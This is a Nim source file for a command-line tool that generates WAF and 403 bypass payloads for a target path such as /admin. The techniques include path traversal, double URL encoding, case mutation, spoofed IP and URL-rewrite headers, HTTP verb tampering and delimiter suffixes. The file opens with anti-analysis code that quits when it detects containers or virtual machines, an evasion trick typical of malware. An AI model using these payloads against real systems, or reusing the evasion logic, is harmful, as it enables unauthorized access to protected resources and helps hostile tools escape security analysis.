## oi-bypass-gen — 403/WAF bypass payload generator
## IPC: NDJSON to stdout; errors to stderr; exit 0=ok
import os, strutils, json, random, osproc, parseopt

# ── Sandbox / debugger detection ──────────────────────────────────────────────

proc antiAnalysis() =
  if getEnv("ONEINFINITY_STUB_BYPASS") == "1":
    return

  when defined(linux):
    if fileExists("/proc/1/cgroup"):
      try:
        let cg = readFile("/proc/1/cgroup")
        if "docker" in cg or "kubepods" in cg or "lxc" in cg:
          quit(1)
      except CatchableError:
        discard

  when defined(linux):
    let dmiPaths = [
      "/sys/class/dmi/id/product_name",
      "/sys/class/dmi/id/sys_vendor",
      "/sys/class/dmi/id/board_vendor",
    ]
    let hypervisorKeywords = ["VBOX", "VMWARE", "VIRTUALBOX", "QEMU", "XEN", "KVM", "HYPER-V"]
    for p in dmiPaths:
      if fileExists(p):
        try:
          let content = readFile(p).toUpperAscii()
          for kw in hypervisorKeywords:
            if kw in content:
              quit(1)
        except CatchableError:
          discard

  when defined(linux):
    let (_, rc) = execCmdEx("ls /proc/self/status")
    if rc != 0:
      quit(1)

# ── Self-integrity verification ───────────────────────────────────────────────

proc verifySelfIntegrity() =
  let skipIntegrity = getEnv("ONEINFINITY_SKIP_INTEGRITY") == "1"
  let isProd        = getEnv("ONEINFINITY_ENV") == "production"

  if isProd and skipIntegrity:
    stderr.writeLine("integrity: ONEINFINITY_SKIP_INTEGRITY=1 blocked in production")
    quit(1)

  if skipIntegrity:
    return

  let selfPath   = getAppFilename()
  let binaryName = selfPath.extractFilename()
  var checksumFile = ""
  var dir = selfPath.parentDir()
  for _ in 0 .. 5:
    let candidate = dir / "checksums.json"
    if fileExists(candidate):
      checksumFile = candidate
      break
    dir = dir.parentDir()

  if checksumFile == "":
    return

  let (hashOutput, rc) = execCmdEx("openssl dgst -sha256 " & quoteShell(selfPath))
  if rc != 0:
    stderr.writeLine("integrity: openssl failed")
    quit(1)

  let parts = hashOutput.strip().split('=')
  if parts.len < 2:
    stderr.writeLine("integrity: unexpected openssl output")
    quit(1)
  let computedHash = parts[^1].strip()

  try:
    let js = parseJson(readFile(checksumFile))
    if js.hasKey(binaryName):
      let expected = js[binaryName].getStr()
      if computedHash != expected:
        stderr.writeLine("integrity: hash mismatch for " & binaryName)
        quit(1)
  except CatchableError as e:
    stderr.writeLine("integrity: " & e.msg)
    quit(1)

# ── Bypass generation ─────────────────────────────────────────────────────────

proc caseMutate(rng: var Rand; s: string): string =
  result = newStringOfCap(s.len)
  for c in s:
    if c.isAlphaAscii():
      if rng.rand(1) == 0: result.add c.toUpperAscii()
      else:                 result.add c.toLowerAscii()
    else:
      result.add c

proc urlDoubleEncode(s: string): string =
  ## Replace %2f with %252f etc. (one pass over common encoded slashes)
  result = s.replace("%2f", "%252f").replace("%2F", "%252F")
    .replace("%2e", "%252e").replace("%2E", "%252E")

proc mkBypass(bypass, technique, target: string): JsonNode =
  %* {
    "event":     "result",
    "bypass":    bypass,
    "technique": technique,
    "target":    target,
  }

proc generateBypassVariants(rng: var Rand; target: string): seq[JsonNode] =
  result = @[]
  template emit(b, t: string) =
    result.add mkBypass(b, t, target)

  # ── Path traversal ───────────────────────────────────────────────────────
  emit(target & "/../" & target.strip(chars={'/'}).split('/')[^1], "path-traversal-dotdot")
  emit("/" & target.strip(chars={'/'}).split('/').join("/../"), "path-traversal-encoded")
  emit("/%2f..%2f" & target.strip(chars={'/'}), "path-traversal-pct2f")
  emit("/." & target, "path-traversal-dotslash")
  emit(target & "/./", "path-traversal-self-ref")

  # ── Case mutation ────────────────────────────────────────────────────────
  for _ in 0 .. 2:
    emit(caseMutate(rng, target), "case-mutation")

  # ── URL double-encoding ──────────────────────────────────────────────────
  let pctEncoded = target.replace("/", "%2f")
  emit(pctEncoded, "url-encoding-slash")
  emit(urlDoubleEncode(pctEncoded), "url-double-encoding")
  emit(target.replace("/", "%252f"), "url-double-encoding-direct")

  # ── Header injection variants ────────────────────────────────────────────
  emit("X-Forwarded-For: 127.0.0.1 | GET " & target, "header-xforwardedfor")
  emit("X-Original-URL: " & target,                   "header-xoriginalurl")
  emit("X-Rewrite-URL: " & target,                    "header-xrewriteurl")
  emit("X-Custom-IP-Authorization: 127.0.0.1",        "header-xcustomip")
  emit("X-Forwarded-Host: localhost | GET " & target,  "header-xforwardedhost")
  emit("X-Real-IP: 127.0.0.1",                        "header-xrealip")
  emit("X-Remote-IP: 127.0.0.1",                      "header-xremoteip")
  emit("X-Client-IP: 127.0.0.1",                      "header-xclientip")

  # ── Chunked transfer bypass (noted as technique) ─────────────────────────
  emit("Transfer-Encoding: chunked | GET " & target, "chunked-transfer-bypass")

  # ── HTTP verb tampering ──────────────────────────────────────────────────
  emit("POST " & target,    "verb-post")
  emit("HEAD " & target,    "verb-head")
  emit("OPTIONS " & target, "verb-options")
  emit("PUT " & target,     "verb-put")
  emit("PATCH " & target,   "verb-patch")

  # ── Path suffix / delimiter tricks ──────────────────────────────────────
  emit(target & "%20",      "suffix-space-pct")
  emit(target & "%09",      "suffix-tab-pct")
  emit(target & "#",        "suffix-fragment")
  emit(target & "?",        "suffix-query")
  emit(target & ";/",       "suffix-semicolon")
  emit(target & "..;/",     "suffix-dotdotsemi")
  emit("//" & target.strip(chars={'/'}), "double-slash-prefix")
  emit(target & "//",       "double-slash-suffix")

  # Extra case variants until we have >= 20
  let suffixes = ["%20", "%09", "#", "?", ";"]
  while result.len < 20:
    emit(caseMutate(rng, target) & suffixes[rng.rand(suffixes.len - 1)], "case-mutation-suffix")

# ── Main ──────────────────────────────────────────────────────────────────────

proc main() =
  antiAnalysis()
  verifySelfIntegrity()

  var targetPath = "/admin"

  var p = initOptParser()
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      if p.key == "target": targetPath = p.val
    of cmdArgument: discard

  var rng = initRand()

  echo $(%* {"event": "meta", "tool": "oi-bypass-gen", "schema_version": "1.0"})

  let variants = generateBypassVariants(rng, targetPath)
  for v in variants:
    echo $v

  echo $(%* {"event": "summary", "count": variants.len, "status": "ok"})

main()
